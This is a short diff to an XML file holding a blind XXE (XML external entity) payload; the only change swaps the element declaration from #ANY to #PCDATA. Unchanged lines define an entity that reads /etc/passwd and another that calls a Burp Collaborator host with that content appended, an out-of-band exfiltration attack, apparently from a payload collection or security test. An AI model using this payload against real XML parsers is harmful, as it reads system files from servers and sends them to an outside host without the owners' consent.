@@ -1,5 +1,5 @@
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-<!ELEMENT foo (#ANY)>
+<!ELEMENT foo (#PCDATA)>
 <!ENTITY % xxe SYSTEM "file:///etc/passwd">
 <!ENTITY blind SYSTEM "https://www.wccol9k9p31yfpnuk45wg0hl7cd51u.burpcollaborator.net/?%xxe;">]><foo>&blind;</foo>
